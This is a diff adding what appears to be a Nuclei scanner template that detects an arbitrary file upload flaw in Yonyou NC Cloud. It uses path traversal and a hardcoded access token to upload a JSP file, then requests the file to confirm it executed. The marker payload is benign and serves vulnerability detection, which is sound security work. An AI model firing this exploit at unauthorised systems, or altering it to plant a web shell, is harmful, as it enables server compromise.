@@ -1,0 +1,56 @@
+id: poc-yaml-yongyou-nc-cloud-uploadchunk-anyfile-upload
+info:
+  name: Yongyou NC Cloud uploadChunk Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9"
+      accessTokenNcc: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"
+    body: |-
+      --024ff46f71634a1c9bf8ec5820c26fa9
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      
+      <%out.println("{{t2}}");%>
+      --024ff46f71634a1c9bf8ec5820c26fa9--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"操作成功!\""
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/nccloud/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
